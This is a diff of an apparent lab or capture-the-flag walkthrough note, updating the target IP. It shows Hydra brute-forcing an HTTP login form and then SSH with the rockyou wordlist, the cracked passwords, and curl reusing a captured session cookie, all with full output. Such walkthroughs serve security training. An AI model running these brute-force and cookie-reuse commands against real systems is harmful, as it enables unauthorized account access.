@@ -1,33 +1,33 @@
-# 10.201.20.141
+# 10.201.106.187
 
-hydra -l <username> -P <wordlist> 10.201.20.141 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -l <username> -P <wordlist> 10.201.106.187 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
-# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.20.141 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.106.187 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/b6adca47-7371-4867-aec6-80b0e34434f0/image.png)
 
 ──(root㉿docker-desktop)-[/]
-└─# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.20.141 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+└─# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.106.187 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-25 15:00:31
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-post-form://10.201.20.141:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect.
-[80][http-post-form] host: 10.201.20.141 login: molly password: sunshine
+[DATA] attacking http-post-form://10.201.106.187:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect.
+[80][http-post-form] host: 10.201.106.187 login: molly password: sunshine
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-25 15:00:43
 
-# curl -X POST http://10.201.20.141/login -d "username=molly&password=sunshine" -L -c -v cookies.txt
+# curl -X POST http://10.201.106.187/login -d "username=molly&password=sunshine" -L -c -v cookies.txt
 
 ┌──(root㉿docker-desktop)-[/]
-└─# curl -X POST http://10.201.20.141/login -d "username=molly&password=sunshine" -L -c -v cookies.txt
+└─# curl -X POST http://10.201.106.187/login -d "username=molly&password=sunshine" -L -c -v cookies.txt
 Note: Unnecessary use of -X or --request, POST is already inferred.
 
-- Trying 10.201.20.141:80...
-- Connected to 10.201.20.141 (10.201.20.141) port 80
+- Trying 10.201.106.187:80...
+- Connected to 10.201.106.187 (10.201.106.187) port 80
 - using HTTP/1.x
   > POST /login HTTP/1.1
-  > Host: 10.201.20.141
+  > Host: 10.201.106.187
   > User-Agent: curl/8.15.0
   > Accept: _/_
   > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
@@ -46,12 +46,12 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 - Ignoring the response-body
 - setting size while ignoring
   <
-- Connection #0 to host 10.201.20.141 left intact
-- Issue another request to this URL: 'http://10.201.20.141/'
+- Connection #0 to host 10.201.106.187 left intact
+- Issue another request to this URL: 'http://10.201.106.187/'
 - Stick to POST instead of GET
-- Re-using existing http: connection with host 10.201.20.141
+- Re-using existing http: connection with host 10.201.106.187
   > POST / HTTP/1.1
-  > Host: 10.201.20.141
+  > Host: 10.201.106.187
   > User-Agent: curl/8.15.0
   > Accept: _/_
   > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
@@ -75,24 +75,24 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
   <pre>Cannot POST /</pre>
   </body>
   </html>
-- Connection #0 to host 10.201.20.141 left intact
+- Connection #0 to host 10.201.106.187 left intact
 
 # 쿠키 확보 -> connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
 
 # cat cookie.txt
 
-# curl http://10.201.20.141/ -b "connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA" -v
+# curl http://10.201.106.187/ -b "connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA" -v
 
-# curl http://10.201.20.141 -b cookies.txt -v
+# curl http://10.201.106.187 -b cookies.txt -v
 
 ┌──(root㉿docker-desktop)-[/]
-└─# curl http://10.201.20.141 -b cookies.txt -v
+└─# curl http://10.201.106.187 -b cookies.txt -v
 
-- Trying 10.201.20.141:80...
-- Connected to 10.201.20.141 (10.201.20.141) port 80
+- Trying 10.201.106.187:80...
+- Connected to 10.201.106.187 (10.201.106.187) port 80
 - using HTTP/1.x
   > GET / HTTP/1.1
-  > Host: 10.201.20.141
+  > Host: 10.201.106.187
   > User-Agent: curl/8.15.0
   > Accept: _/_
   > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
@@ -144,4 +144,19 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
     </body>
   </html>
 
-- Connection #0 to host 10.201.20.141 left intact
+- Connection #0 to host 10.201.106.187 left intact
+
+> hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.106.187 -t 4
+> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.106.187 -t 4 ssh
+
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-26 15:23:18
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.201.106.187:22/
+[22][ssh] host: 10.201.106.187 login: molly password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-26 15:23:37
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/5f8f9b50-2ea5-4c89-803c-36876f8de76c/image.png)
